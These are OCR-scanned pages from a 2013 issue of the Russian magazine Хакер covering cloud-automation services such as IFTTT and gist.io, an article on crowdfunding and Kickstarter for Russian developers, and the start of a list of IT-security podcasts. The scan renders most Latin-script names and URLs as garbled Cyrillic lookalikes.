автоматически сохранять в Іпзіарарег все 
статьи, которые я отметила в боодіе РеаЬег, 
или посылать мне на е-таіі сообщение, если 
завтра будет дождь. Вариантов множество. 
Можно создавать свои решения или вос- 
пользоваться уже готовыми. 

Однако именно поддержка практиче- 
ски всех популярных облачных сервисов 
радует отдельной строкой. Возможности 
открываются почти неограниченные — 
автоматическое сохранение всех фото- 
графий из Іпзіадгат в ОгорЬох, Бкуйгіѵе 
или другое хранилище. Тебя отметили на 
фото в РасеЬоок? Автоматически сохраняем 



ПУБЛИКУЕМ СТАТЬИ В 6ІТНІШ 



Подходит для: СіЖиЬ 



6І5І.І0 






ВИЯ 



Оказывается, біЖиЬ — это не только «со- 
циальная сеть для разработчиков» (как 
характеризуют свой проект создатели), 
где можно размещать код и работать над 
проектами. біЖиЬ также можно использо- 
вать нетривиальным образом, а именно — 
для публикации статей/заметок, не под- 
держивая при этом полноценный блог. 

Поможет нам в этом деле сервис дізі. 
іо, чье название недвусмысленно наме- 
кает на то, как именно мы будем публико- 
вать контент. У біЖиЬ есть собственный 



разІеЬіп-сервис ( аІБІ.оііИиЬ.сот ) для бы- 
строй публикации фрагментов кода, вот 
его-то мы и используем. Как пишут созда- 
тели дізі.іо: «иногда хочется поделиться 
текстом, который не вписывается в привыч- 
ные рамки. Возможно, хочется поделиться 
чем-то со специфической аудиторией, 
не адресуя текст тем, кто обычно читает 
ваш блог. Возможно, текст просто не уме- 
щается в 140 символов». В такой ситуации 
даже завести регу в ТитЫг — это уже из- 
лишние усилия и ненужные телодвижения. 



0 6 О « Й * 
^ А Ф 0 і* В 

ЮІБФ 



такие фото в ОгорЬох. Словом, здесь есть 
практически все, что только могло прийти в 
голову: автоматическая архивация твитов, 
фотографий, ведение логов своей сетевой 
активности в электронных таблицах и так 
далее, далее, далее. 

Добавим к этому простой и удобный 
интерфейс, 57 каналов (поддерживаемых 
сервисов) и абсолютную бесплатность. Если 
ты еще не пользуешься ІРТТТ, настоятельно 
рекомендую попробовать и удивиться, как 
ты жил без этих удобных мелочей раньше :). 



Вот что предлагают разработчики 
дізі.іо: заводим публичный дізі на СііНиЬ 
с одним или более Магксіоѵѵп-файлами. За- 
поминаем Ю дізГа. Как правило, это число 
вида 29388372. Вводим в строке браузера 
«дізІ.іо/твой-дізІ-Ю» и наслаждаемся ак- 
куратным текстом с правильной разметкой, 
заголовками, картинками и прочими сви- 
стелками (как все это настроить и что под- 
держивается, описано на сайте). Удобный 
способ, например, для публикации статей 
в социальных сетях. 




034 



ХАКЕР 01 /168/2013 






На седьмом небе 



АВТОМАТИЗИРУЕМ РАБОТУ С ФАЙЛАМИ 



Подходит для: ЭгорЬох, боодіе Огіѵе, Вох 



ѵѵ аррѵ/оІГсот 



ѴѴаррѵѵоІ? Аиіотаіог — сервис многофунк- 
циональный и полезный. Он не только 
позволит связать ОгорЬох, боодіе Огіѵе или 
Вох с Еѵегпоіе, РасеЬоок, РІіскг и другими 
сервисами, но также поможет автомати- 
зировать и упростить работу с файлами. 
Список действий-рецептов здесь достаточ- 
но велик (хотя до многообразия ІРТТТ ему 
и далеко). Присутствуют конвертирование 
файлов в РОР-формат, отправка файлов 
на печать в боодіе СІоисІ Ргіпі, конвертация 
в еВоок, обработка изображений (кон- 



вертация, ресайз, добавление к картинке 
текста, «водяного знака», удаление ЕХІР 
и так далее), шифрование файлов и многое 
другое. Настроить действия для каждой 
выбранной папки крайне просто, доба- 
вить такой сервис к ОгорЬох или другому 
хранилищу не составит труда. ѴѴаррѵѵоІІ, 
на мой взгляд, неплохо подойдет тем, кому 
часто приходится работать с большим 
количеством фото, много конвертировать 
из формата в формат и вообще сталкивать- 
ся с большими потоками данных. 



АіЛотаІе уоиг ОгорЬох 




ѵ Цгоріюх Соі$Іс Ьск Б 




ДЕЛАЕМ БЭКАПЫ САЙТОВ И НЕ ТОЛЬКО 



Подходит для: ОгорЬох, ЗкуОгіѵе, боодіе Огіѵе, Вох и так далее 



тѵЬаскирЬох.сот 



Вопрос бэкапов актуален всегда, об этом 
хорошо знает каждый, кто хоть раз безвоз- 
вратно терял свои данные. 

Васкир Вох — настоящая мечта не толь- 
ко для пользователя облачного хранили- 
ща, но и для ленивого владельца сайта. 
Сервис поддерживает РТР, 5РТР, ѴѴогЬРгезз, 
-Іоотіа, йгираі, Му5СІІ_, Атагоп 53 и так да- 
лее, и тому подобное. Говоря проще, Васкир 
Вох готов бэкапить все, чему требуется 
регулярное и своевременное создание ре- 
зервных копий. Что до облачных хранилищ, 



Васкир Вох поможет синхронизировать друг 
с другом ОгорЬох, Зкубгіѵе, боодіе Огіѵе, 

Вох и другие сервисы. Это удобно, если 
ты пользуешься несколькими облачны- 
ми хранилищами параллельно или если 
ты, к примеру, собираешься перебраться 
с боодіе Огіѵе на ОгорЬох, но не имеешь же- 
лания переносить все файлы вручную. Кста- 
ти, упомянутые ленивые владельцы сайтов 
могут настроить передачу бэкапов сайта 
все в тот же ОгорЬох (или другие сервисы), 
что тоже весьма удобно. Проект бесплатен, 




точнее, работает в формате (геетіит — вся 
основная функциональность бесплатна, 
но за какие-то «особые опции» уже при- 
дется заплатить. 



СОБСТВЕННАЯ ОФИСНАЯ СРЕДА В ОБЛАКЕ 



Подходит для: ОгорЬох 



ѵѵгіІе-Ьох.арр5РОІ.сот. ІіпѵигІ.сот/Ы4ЬтІг 



Как ни странно, далеко не все «прогрес- 
сивное человечество» пользуется для хра- 
нения документов и работы с ними сер- 
висом боодіе Огіѵе (бывшим боодіе Оосз). 
Кому-то глубоко несимпатична «корпора- 
ция добра», кто-то просто привык к другим 
облачным сервисам, в общем, причины 
у всех свои. Очевидно одно: таких людей 
больше, чем может показаться на пер- 
вый взгляд, —для ОгорЬох существует 
сразу несколько текстовых редакторов, 
автоматически синхронизирующихся с об- 



лачным хранилищем. Наиболее популярно 
бесплатное приложение РІаіпТехІ для І05. 
Это полноценный текстовый редактор, 
с минималистичным и элегантным интер- 
фейсом, который позволяет как сохранять 
написанное в ОгорЬох, так и открывать 
хранящиеся там файлы для редактиро- 
вания. Для АпсІгоісІ также есть аналоги, 
к примеру ЕрізІІе. Если же нужда в исполь- 
зовании редактора возникает не так часто, 
можно обратить внимание на онлайновый 
сервис ѴѴЬіІеЬох, который тоже умеет все, 




что должен уметь редактор, и сразу сохра- 
няет тексты в ОгорЬох. 



ХАКЕР 01 /168/2013 



035 



РС20ЫЕ 



Анти Данилевский ІапІі.сІапіІеѵзкіІЗдгпаіІ.сот) 





Власт 

толп 



Кіскзіагіег — одна из горячих тем последнего времени. Эта площадка дала жизнь и средства на су- 
ществование множеству проектов по созданию необычных игр, гаджетов и не только. Поэтому впол- 
не возможно, что ты уже слышал и о самом сервисе, и о некоторых его «выпускниках». Интересно, 
что в последнее время ряды проектов, отданных на милость толпе, пополняют детища команд наших 
соотечественников. Следовательно, к ним можешь присоединиться и ты, верно? 



036 



ХАКЕР 01 /168/2013 






Власть толпе 




Пример игры ЬедепОз о? ЕізегшаШ белорусских разработчиков показывает, 
что пользоваться платформой могут и наши соотечественники 



С лово «краудфандинг» происходит 
I от двух английских слов: сгоѵѵсі — 
толпа и Іипсііпд — финансирование. 
Дословно это можно перевести как «финан- 
сирование толпой» или «народное финанси- 
рование». На самом деле краудфандинг — это 
относительно новый способ привлечения 
средств на разработку проектов. Действует это 
следующим образом: автор проекта предла- 
гает или идею, или (чаще) прототип проекта. 
Далее, вместо классической схемы, когда автор 
или команда привлекали деньги от издате- 
лей, венчурных фондов или других компаний, 
разработчики предлагают обычным людям 
профинансировать разработку. При этом речь 
идет о совершенно разных суммах. В то вре- 
мя как от фондов или инвесторов получают 
большие суммы в один или несколько этапов, 
при краудфандинге средний платеж составляет 
45 долларов, но количество людей исчисляется 
сотнями для маленьких проектов и до десятков 
тысяч — для больших. Все сборы проходят 
на специальных краудфандинговых интернет- 
площадках, самая известная из них — Кикстар- 
тер ( кісквіагіег.сот ). следом за ней — ИндиГоГо 
І іпсііедодо.сот ). На текущий моменттаких ак- 
тивных площадок более пятидесяти, но широ- 
кой известностью пользуется всего несколько. 

В краудфандинге есть одно важное от- 
личие от стандартного инвестирования: 
люди, которые вкладывают деньги в проекты, 
не становятся инвесторами, соучредителями 
или акционерами. Даже более того, по закону 
США (где сосредоточено 90% проектов и ауди- 
тории краудфандинга) они не могут становиться 
совладельцами компании разработчика. Только 
в первом квартале 2013 года выйдет новый за- 
кон, Э0В5 асі, по которому разработчик сможет 
продавать таким образом доли/акции своей 
компании. Это дает разработчику возможность 
делать именно тот проект, который он считает 
нужным делать, без стороннего вмешательства 
и навязывания ему идей или систем, которые 
часто противоречат первоначальной концеп- 
ции проекта. Тем не менее люди охотно платят 
и становятся «бекерами» (от англ. Ьаскег, 
что можно вольно перевести как «человек, ко- 
торый поддержал проект деньгами»). У многих 
незнакомых с краудфандингом или знакомых 
только со стороны и никогда не поддерживав- 
ших проекты на одной из площадок это вызы- 
вает недоумение: зачем платить за то, чего еще 
нет и, возможно, и не будет. Может быть, их всех 
обманули и красивыми речами и картинками 
выманили их кровные? Но конечно, это не так. 

ЗАЧЕМ ОНИ ПЛАТЯТ? 

Кто такие бекеры, зачем они отдают неиз- 
вестным людям свои деньги? Ответ прост: 
это обычные люди, которые хотят увидеть 
проект воплощенным в жизнь и готовы ради 
этого его поддержать — пожертвовать проекту 
свои деньги. Но помимо ощущения удовлетво- 
рения от совершенного благого дела, бекеры 
получают еще и массу приятных призов. Самый 
популярный и основной — приобретение 
будущего продукта существенно дешевле, чем 



он будет впоследствии продаваться, вплоть 
до 10% от его будущей стоимости. И неважно, 
что это — игра, колода игральных карт особого 
дизайна, маска для сна, или часы, синхронизи- 
рующиеся с вашими мобильными устройствами, 
или пожизненная скидка 50% в кафе (которое 
будет когда-нибудь построено на собранные 
средства). Каждый проект, запущенный на кра- 
удфандинговой площадке, имеет линейку своих 
оригинальных и часто уникальных призов, ко- 
торые смогут получить только бекеры и только 
во время кампании по привлечению средств. 

Но не одно это привлекает бекеров в про- 
екты. Для многих это — способ получить тот 
продукт, который они хотят и который иначе 
никогда может не увидеть свет. Ярким примером 
может послужить недавний бум на Кикстартере 
космических игр, которые до недавнего времени 
не рассматривались издателями всерьез. И ве- 
роятно, очень зря: Біаг Сііігеп, проект Криса Ро- 
бертса, которого вы, возможно, знаете по сериям 
ѴѴіпд Соттапйег, собрал 6,2 миллиона долларов, 
поставив мировой рекорд. Чуть больше двух 
миллионов было собрано на Кикстартере, остав- 
шаяся сумма — на сайте игры. Всего поддержа- 
ли проект почти 90 тысяч человек. Это наглядно 
демонстрирует, что, например, индустрия игр, 
контролируемая издателями, не совсем такая, 
какой ее хотят видеть многие игроки. 

Для многих бекерство превращается в хобби 
и даже в манию. Нередко можно увидеть 
комментарии вроде «Я не должен этого делать, 
моя жена меня убьет, но я не могу пройти мимо 
этого проекта!» или «Мой бюджет уже исчер- 
пан в этом месяце, но со следующей зарплаты 
я с вами». Почему так происходит? Это азартно. 
Поддержка проекта, активное в нем участие, 
общение с разработчиками и помощь в его рас- 
крутке действительно захватывающий процесс, 
чем-то напоминающий игру. Только тут все 
по-настоящему: настоящая цель, настоящие 
люди и сложности, настоящие вызовы. Бекеры 
создают сообщества вокруг проектов, которые 
они поддерживают и которые искренне любят, 
находят единомышленников и друзей. В часы 



кампании напряжение и активность бекеров 
достигают пика и могут произойти настоящие 
чудеса. Так, буквально за 10-12 последних часов 
игра БіагІідМ Іпсерііоп собрала недостающие 
30% (40 тысяч долларов). Это стало возможно 
только благодаря бекерам, которые сделали, 
казалось бы, невозможное. По словам некото- 
рых участников, после того как кампания завер- 
шилась, у них дрожали руки и колени, а сердце 
готово было выскочить из груди. Такое участие 
превращается в аттракцион и развлечение, ко- 
торое можно по достоинству оценить и понять, 
только оказавшись вовлеченным в интересный, 
желанный проект. К счастью, выбирать есть 
из чего и с каждым днем интересных проектов 
становится все больше. 

Подведя промежуточный итог, можно смело 
сказать, что краудфандинг за рубежом испыты- 
вает невероятный подъем, он популярен и отно- 
шение к нему просто великолепное. Возникает 
закономерный вопрос: а как обстоят дела с кра- 
удфандингом в России? Есть ли отечественные 
площадки, чтобы дать шанс нашим разработ- 
чикам такую же возможность? К сожалению, 
ситуация в нашей стране неутешительная. Хотя 
краудфандинговые площадки в России есть 
и существуют уже довольно давно (например, 

С Миру По Нитке и Планета), менталитет русско- 
го человека не соответствует самой концепции 
краудфандинга. Поддерживать отечествен- 
ных разработчиков не модно; игры, фильмы 
и музыку принято качать с торрентов. Что тут 
говорить о вложении денег в то, чего еще даже 
нет, и непонятно, какое оно будет? Есть и много 
других факторов, делающих краудфандинг 
в России пока что невозможным: от отсутствия 
чувства локтя до реалий современной жизни, 
где каждый сам за себя. Изменится ли это ког- 
да-нибудь, покажет время. Скорее всего, если 
это и произойдет, то с опозданием на много лет. 

В ЭТИХ ДЖУНГЛЯХ 
НАС НИКТО НЕ ПОНИМАЕТ 

Все вышесказанное оставляет разработ- 
чику только один выход: искать поддержки 



ХАКЕР 01 /168/2013 



037 




РС20ЫЕ 



за рубежом, у более лояльно настроенной 
и дружественной аудитории. Но тут есть свои 
серьезные сложности, особенно если пытаться 
попасть на Кикстартер. Во-первых, для этого 
надо иметь счет в банке США или Великобрита- 
нии и быть резидентом одной из этих стран. Это 
решается, но достаточно сложно, в ряде случа- 
ев надо еще и подтвердить наличие деятель- 
ности компании. Если эта проблема решается, 
то следующая для многих оказывается не ме- 
нее серьезной: языковой барьер. Бекеры хотят 
видеть, кому они дают свои деньги, и представ- 
ляющее проект видео, на котором нет авторов/ 
разработчиков, серьезно снижает шансы 
на успех. Решений несколько, от рассказа о сво- 
ем проекте на ломаном английском до дубли- 
рования в студии. Ни один из этих вариантов 
не является однозначно хорошим; кроме того, 
на протяжении всей кампании автору проекта 
придется общаться с бекерами, отвечать на их 
вопросы, писать новости и обновления... К это- 
му надо быть хорошо подготовленным. 

И конечно, к русским отношение за рубежом 
специфическое, особенно когда речь заходит 
о деньгах и доверии. Безусловно, это не зна- 
чит, что денег тебе не видать, — есть примеры 
успешных проектов наших соотечественников 
Цедепсіз о* Еівепѵѵаісі или Кпоск-Кпоск). Но за- 
воевать доверие будет гораздо сложнее, нужно 
показать действительно хороший проект, 
хорошее видео и то, что авторы горят своим 
проектом. Но как показывает практика, самое 
сложное не это. 

Самое сложное — это получить поддержку 
в зарубежной прессе, причем роль играют 
только большие порталы. Это не преувели- 
чение: один обзор на, например, ТесЬсгипсЬ 
сыграет роль гораздо большую, чем сто или 
даже двести обзоров на мелких порталах или 
блогах. С форумами картина схожая. Напри- 
мер, об игре Біѵіпе Брасе было написано более 
чем на 150 англоязычных форумов, шли обсуж- 
дения разной интенсивности, но ощутимого 



эффекта это не дало. Для сбора более-менее 
серьезной суммы нужно не меньше 50 000 про- 
смотров презентационного видео (пример — 
1_едепсІ5 о( ЕізепѵѵаИ, 55 тысяч просмотров 
видео и сбор 85 тысяч долларов; Біѵіпе Брасе, 
20 тысяч просмотров и 30 тысяч долларов 
собрано). То есть, если проект даже хороший 
и нравится бекерам, все решает то, пишут ли 
о нем большие издания. Шансы, что напишут 
про неизвестных разработчиков из непо- 
нятной страны, где ходят по улице медведи, 
небольшие... если не проведена правильная 
подготовка (в данном случае речь идет о мар- 
кетинговой подготовке, о подготовке кампании 
будет немного позже). Что будет правильным? 
Точно известная дата запуска, предваритель- 
ные договоренности о публикации с прес- 
сой и заранее подготовленные материалы. 

В идеале это разосланный по гарантированно 
работающим каналам пресс-релиз, который 
заинтересовал журналистов и редакторов 
и дал обратную связь. Наиболее вероятно, 
что без пиар-агентства, имеющего выходы 
в сфере запускаемого проекта, разработчикам 
самостоятельно это не удастся. Кроме того, 
не имея звездного имени и славы, живого 
сообщества, без качественной демонстрации 
проекта серьезных сборов не получишь. На- 
пример, для йіѵіпе Брасе отсутствие боевого 
геймплея стало третьей по важности причи- 
ной, по которой часть журналистов из большой 
прессы не стали писать обзоры, даже несмотря 
на то, что игра и идея, концепция и арт, под- 
готовка проекта и материалы вызвали самые 
положительные отзывы. Тут надо понимать, 
что большие издания очень серьезно относят- 
ся к своей репутации и им лучше не написать 
обзор, чем допустить к публикации даже со- 
всем немного рискованный материал. 

ЛЮБИМЕЦ ПУБЛИКИ 

Если ты все же решишь испытать свою удачу 
на одной из площадок, то при подготовке 



кампании стоит учесть следующие моменты, 
критически важные для успеха кампании. 

Презентационное видео. На этом видео 
должны быть ты и/или твоя команда, оно 
должно показывать твой будущий проект и то, 
что есть сейчас. Это видео должно быть инте- 
ресным, увлекательным, оно должно показать 
всем и каждому, почему твой проект должен 
быть сделан. Будь собой, будь честен и искре- 
нен, не превращай видео в обычную скучную 
презентацию. Если это игра, то покажи в видео 
твою игру, какой будет игровой процесс. Самый 
лучший совет, который можно тут дать, — 
это изучить аналогичные проекты, выбрать 
наиболее понравившееся видео и стремиться 
сделать что-то похожее. 

Награды (реворды), которые получат 
бекеры за свои вклады. Чем выше вклад, 
тем лучше и дороже награда. Например, очень 
часто за 15 долларов ты можешь получить 
коробку с игрой, которая после издания игры 
будет стоить, например, 50 баксов, а в награду 
за 50 долларов — подарочное издание + майку 
+ флешку с лого игры. Наград может быть мно- 
го разных, от 1 и до 10 000 долларов. Напри- 
мер, Тим Шейфер «продал» четыре обеда с ним 
и Роном Гилбертом четырем разным людям. 
Стоимость обеда составила 10 000 долларов. 
Вряд ли кому-то будет интересен обед с тобой, 
но интересные твоей целевой аудитории на- 
грады значительно повысят твои сборы и, со- 
ответственно, шансы на успех. 

Целевая сумма, которую ты хочешь со- 
брать на проект. Если ты поставишь слишком 
мало — мало и соберешь (за таким редким ис- 
ключением, как РТ1_: разработчики просили 10 
тысяч, а собрали 200 тысяч). Если ты попросишь 
слишком много, то тебе не поверят и не будут 
в тебя вкладываться. Опять же такие звезды, 
как Брайан Фарго, могут попросить и пару мил- 
лионов, хотя даже он заявил 900 тысяч. Поэтому 
надо трезво оценивать свои силы, сложность 
проекта и потенциальный интерес аудитории 
не только к твоей игре, но и к выбранному жан- 
ру, сеттингу и прочему. 

Целевая аудитория. Надо понимать, есть 
ли на этой краудфандинговой площадке твоя 
целевая аудитория и насколько твой проект 
вообще будет ей интересен. Например, йіѵіпе 
Брасе оказался неинтересен из-за того, что по- 
добных игр еще нет на планшетах и, соответ- 
ственно, такой целевой аудитории еще просто 
не существует в необходимом объеме. И очень 
вероятно, что если бы Оіѵіпе Брасе разра- 
батывался для персональных компьютеров, 
то сумма была бы собрана без особых проблем. 
Кроме того, награды должны быть интересны 
целевой аудитории. При разработке наград 
нужно четко понимать, для кого ты делаешь 
проект, кем является твой рядовой потреби- 
тель, ради чего и какой суммой он будет готов 
пожертвовать. Для примера, любители тяже- 
лого металла вряд ли поддержат тебя, если 
наградой будет кукла Барби. 

План кампании. Это конкретное понимание 
того, что ты должен будешь сделать, чтобы 
о тебе узнали и освещали бы твой проект 




Благодаря Кіск$1аг(ег возрождаются давно забытые игры, 
включая Жазіеіапгі Брайана Фарго, СагтадеМоп и другие. 



038 



ХАКЕР 01 /168/2013 




Властыолпе 




Авторам РеЬЫе удалось собрать более 10 миллионов 
долларов на создание умных часов... 




...а разработчикам Оиуа удалось собрать восемь 
с половиной миллионов на целую игровую платформу 



в прессе. Без такого плана твои шансы на успех 
практически равны нулю. Сюда же входит план 
обновлений и новостей на весь срок кампании, 
арт, материалы, музыка и все прочее, что может 
поддерживать интерес к кампании, привлекать 
новых бекеров и генерировать обсуждения. 
Обычно такими новостями бывают рассказы 
о проекте или команде, ответы на самые частые 
и животрепещущие вопросы. 

Риски проекта. Ты должен понимать ос- 
новные риски, по которым твой проект может 
не собрать нужную сумму, и по возможности 
их минимизировать. Если это сделать невоз- 
можно, то нужно иметь план Б: что делать, 
если проект не собрал нужную сумму (под- 
робнее об этом будет немного позже). Напри- 
мер, у Ріѵіпе Брасе было три основных риска, 
которые были изначально известны и учтены: 
платформа іРасІ и модель монетизации {гее-2- 
ріау, что порождало третий (и самый главный) 
риск — отсутствие копии игры в качестве 
награды (так как игру и так все должны были 
получить бесплатно). Каждый из этих рисков 
немного снижал конверсию посетителей 
в бекеров, что привело к недопустимо низкому 
уровню (около 3%). Это создало у новых посети- 
телей впечатление, будто проект неинтересен 
массе, и эффекта снежного кома не случилось, 
что решило судьбу игры. 

Риски успеха. Успех кампании тоже несет 
в себе множество рисков, но иного свойства. 

Это в основном риски ответственности и взятых 
на себя обязательств. Тебе предстоит изготовить 
и выслать награды, которые ты обещал своим 
бекерам, а также в срок завершить свой проект. 
За проектами, собравшими средства при помо- 
щи краудфандинга, пристально следят и бекеры, 
и пресса. Задержка в сроках или провал проекта 
вызовет бурю негодования, и если пресса о тебе 
не писала, то о твоем провале напишет со- 
вершенно точно. Поэтому, если нет абсолютной 
и непоколебимой уверенности в том, что твой 
проект будет завершен, лучше кампанию по при- 
влечению средств даже не начинать. 

Это подводит нас к интересному момен- 
ту: если твоя кампания провалилась, то это 
прекрасный результат! Ты совершенно точно 
увидишь, как и почему это случилось, соберешь 
мнения своих бекеров и тех, кто ими не стал, 



и сможешь вовремя скорректировать проект, 
переработав его слабые стороны. И вместо 
того, чтобы выходить на рынок с сырым и не- 
востребованным продуктом и затем спешно 
его исправлять и корректировать, ты сможешь 
стартовать с уже внесенными заранее ис- 
правлениями или улучшениями. Можно смело 
сказать, что краудфандинговая кампания — это 
не только сбор средств на разработку, но и про- 
верка твоей идеи на востребованность. Вполне 
может оказаться, что твоя гениальная идея 
интересна только тебе и твоим друзьям. Может 
быть и наоборот, идея окажется взрывной 
и настолько гениальной, что придется вносить 
соответствующие корректировки в стратегию 
развития и бизнес-план. 

Важно еще и отношение разработчиков 
к краудфандингу. Многие считают (особен- 
но в нашей стране), что это легкие деньги 
и вообще так называемая халява. Другие 
люди (также в основном русские), которые не 
понимают явление краудфандинга, смотрят 
на собирающих деньги разработчиков схожим 
образом, считая их чуть ли не мошенниками. 

Но конечно, это не так. Краудфандинг ни в коем 
случае не является золотым ключиком. Это 
огромная работа, от качества проведения 
которой зависит успех всей кампании или про- 
вал. Важно понимать, что это не должно быть 
просьбой помочь разработчику материально, 
чтобы он смог сделать проект своей мечты. Это 
совместное творчество и создание продукта, 
в котором заинтересован и разработчик, и его 
бекеры. Кампания будет успешной только в том 
случае, если ты будешь щедр и поделишься 
твоей идеей и видением конечного продукта 
со своей целевой аудиторией. 

СКЕПТИКИ БУДУТ ПОСРАМЛЕНЫ 

Если тебя не отпугнуло написанное выше 
и ты хочешь попробовать свои силы, проверить 
актуальность своей идеи на одной из пло- 
щадок, то обязательно почитай, что пишут 
разработчики, имеющие опыт краудфандин- 
га. Особенно важно общее мнение, которое 
можно увидеть почти в любом пост-мортеме: 
«кампания по привлечению средств превра- 
тится в вашу основную работу». Не стоит от- 
носиться к этому легкомысленно. Именно так 



все и будет, если тебе действительно важен 
результат и успех кампании. Более того, если 
ты планируешь вести кампанию в одиночку, 
ты снижаешь свои шансы на успех. Помощники 
и команда, участвующие в кампании, не только 
помогут распространять информацию и об- 
щаться с бекерами, журналистами, прессой 
(что, несомненно, важно). Но это еще и мораль- 
ная поддержка и стимул двигаться дальше, 
делать больше, преодолевать трудности, пре- 
пятствия и иногда — негатив со стороны тех, 
кто остался в прошлом веке и не понимает или 
не хочет понимать, что такое краудфандинг 
и как он работает. 

В заключение некоторые мысли о том, 
какое будущее ждет краудфандинг. Основной 
аргумент скептиков звучит примерно так: 
«посмотрим, что случится, когда всем этим на- 
собиравшим деньги проектам настанет время 
выйти, после этого краудфандинг ждет смерть 
и гибель, все разочаруются и больше никто 
никогда не отдаст свои деньги хитрым разра- 
ботчикам!» Однако мало кто из них потрудился 
вникнуть в суть вопроса. Краудфандинг в том 
или ином виде существует уже много лет, пер- 
вые проекты собирали деньги задолго до бума 
популярности Кикстартера. За это время была 
получена статистика, которая дает ответ на по- 
добные мнения. Профессор Итан Моллик взял 
381 случайный проект из разделов «дизайн» 
и «технологии» и изучил их статистику. В со- 
вокупности эти проекты собрали 4,5 миллиона 
долларов. Из них четырнадцать не выполнили 
свои обещания, три вернули деньги своим 
бекерам. Одиннадцать оставшихся «потеряли» 
около 21 тысячи долларов, что равняется всего 
лишь 0,5% от всех сборов. Если бы в традицион- 
ном бизнесе был такой показатель успешности, 
мы бы сейчас жили в совсем другом мире. Ре- 
зюмируя, можно предположить, что с краудфан- 
дингом и дальше будет все прекрасно. Интерес 
может снизиться, но аудитория бекеров в бли- 
жайшие годы будет продолжать увеличиваться 
и, скорее всего, стабилизируется только через 
много лет, а компаний, начинающих свой путь 
при помощи краудфандинга, будет все больше. 

Будет ли краудфандинг когда-нибудь 
работать в России? Неизвестно. Для того чтобы 
он начал работать, должен измениться не толь- 
ко менталитет современного русского челове- 
ка, но и условия жизни. Если для гражданина 
США отдать 20-100 долларов на понравив- 
шийся ему проект не представляет проблем, 
то для большинства русских людей это при- 
личные суммы. Поэтому, пока Россия не станет 
благополучной страной, краудфандинг будет 
развиваться очень медленно. Возможно, если 
на отечественной площадке случится какой- 
нибудь громкий успех наподобие ѴѴазІеІапгі 2, 
ситуация изменится и сформируется зачаток 
сообщества бекеров. Кикстартеру потребова- 
лось четыре года на то, чтобы дождаться пер- 
вой действительно удачной кампании, после 
чего о краудфандинге заговорили повсеместно. 
Сколько нужно на такое же нашей стране, по- 
кажет время. Но одно совершенно точно: все 
в ваших руках и зависит от каждого из вас. □□ 



ХАКЕР 01 /168/2013 



039 




РС20ЫЕ 



Мария «МіІгіІІ» Нефедова [тіігііійгеаі.хакер.ги) 



Что посмотреть 


р 


и послушать 





Не секрет, что в сегодняшнем океане информации ориентироваться 
довольно сложно. К тому же далеко не всем есть когда вычленять 
из плотного информационного потока самое лучшее и интересное. 
Сегодня мы попробуем сэкономить твое время. Представляем спи- 
сок гарантированно интересных подкастов и видеокастов о хакинге, 
информационной безопасности и не только. Епіоу! 



Слово «подкастинг» образовано 
от английских іРосІ и Ьгоасісазі- 
іпд (повсеместное вещание). 
Подкастингом называют процесс 
создания и распространения 
звуковых или видеофайлов 
(подкастов и видеокастов) в стиле 
радио- и телепередач в интернете. 
По сути, это разновидность 
блоггинга. Итоговый файл 
обычно публикуется на сайте 



проекта и так распространяется. 
Наверняка ты знаком с ресурсами 
росИт.ги и гросі.ги. где легко 
можно составить свой интересный 
плей-лист, в том числе и ІТ- 
шной направленности. Однако 
не все подкасты сосредоточены 
на подобных ресурсах. 



ГОРЯЧАЯ 
ДЕСЯТКА 
ПОДКАСТОВ 



РАДИО Т| 

гас)іо-1.сот 

• еженедельно • русский 

Думаю, многим читателям знакомо 
это еженедельное Ні-ТесЬ-шоу, вы- 
ходящее в прямой эфир по субботам 
в 23:00 по московскому времени. 
Аудитория подкаста еще год назад 
составляла примерно сто тысяч че- 
ловек, а сейчас и того больше. Офи- 
циальное описание гласит: «авторы 
и приглашенные гости импровизируют на околокомпьютерные темы. 
Как правило, не залезая в глубокие дебри, однако иногда нас заносит 
;)». В гостях у ребят действительно бывают очень интересные и самые 
разные ІТ-люди, плюс можно предлагать свои темы для обсуждения 
и общаться с ведущими в ЗаЬЬег-чате во время эфира. 



ТНЕ АКТ ОР РР06КАММІМС 

Іаор.гросГги 

• нерегулярно (ранее еженедельно) • русский 

Подкаст довольно необычной раз- 
новидности — он ориентирован 
на программистов и сочувствующих 
(то есть студентов, начинающих 
разработчиков и так далее). Автор 
регулярно обозревает тематиче- 
скую литературу, которая может 
пригодиться в работе, говорит 
об образовании, освещает интерес- 
ные материалы в Сети и излагает 
сложные вещи крайне доходчиво 
и понятно. Программистам опреде- 
ленно рекомендуется! 





040 



ХАКЕР 01 /168/2013 




Горячая десятка подкастов 



НАК5 

Ьакб.огд 

• еженедельно • английский 

Известнейший американский 
видеокаст, существующий с 2005 
года и вобравший в себя буквально 
все. Этот 35-минутный коктейль 
в равных пропорциях сочетает 
в себе разные хакерские штучки, 
«сделай сам» проекты, коммен- 
тарии экспертов, юмор, моддинг, 
сцену, игровые новости, новости ІТ-индустрии и так далее, далее, 
далее. Каждый найдет здесь что-то свое, и скучно точно не будет. 



РАІЛТЮТСОМ — 5ЕСШІТѴ ѴѴЕЕКІ.Ѵ 

раиісіоісот.сот 

• еженедельно • английский 

В Данный подкаст целиком посвящен 
проблемам, новостям и нюансам 
информационной безопасности. 
Подкаст «именной», он представ- 
лен довольно известным экспертом 
в области ИБ Полом Асадурианом 
(РаиІ Азасіоогіап), евангели- 
стом ТепаЫе ІМеІѵѵогк Бесигііу. 

Соведущими Пола выступают несколько секьюрити-экспертов. 

В РаиЮоіСот освещаются последние новости, уязвимости, исследо- 
вания и так далее. Согласно официальному описанию, слушая этот 
подкаст, ты станешь настоящим «секьюрити-ниндзя» :). 



РІ5КѴ ВІІБІЫЕББ 

ГІ5кѵ.ЬІ2 

• еженедельно • английский 

Австралийский подкаст от Патри- 
ка Грея (Раігіск бгау), известного 
журналиста, работающего с такими 
изданиями, как ТНе Аде, ѴѴігесІ, 
20№і, СМеІ, и эксперта в области 
ИБ. Різку Визіпезз выходит с 2007 
года, насчитывает уже более 200 
выпусков и повествует в основном 
о проблемах информационной безопасности. Здесь ты найдешь ново- 
сти, исчерпывающие интервью со знаменитыми персонами, а также 
различные полезные лекции и презентации. Официальное описание 
гласит, что это «подкаст о безопасности без лишнего трепа». 

100% ѴІРІІ5 РРЕЕ РСЮСА5Т 

ѵѵ\\'Уѵ.е5е1погі32.гц/сотрапѵ/ѵігц5ІаЬ/рос1са5{ 

• ежемесячно (иногда реже) • русский 

Александр Матросов ( атаігогоѵ. 
Ыодзроі.ги і из компании Е5ЕТ 
ведет данный подкаст для того, 
чтобы ты всегда был в курсе за- 
метных событий, происходящих 
в сфере антивирусных технологий 
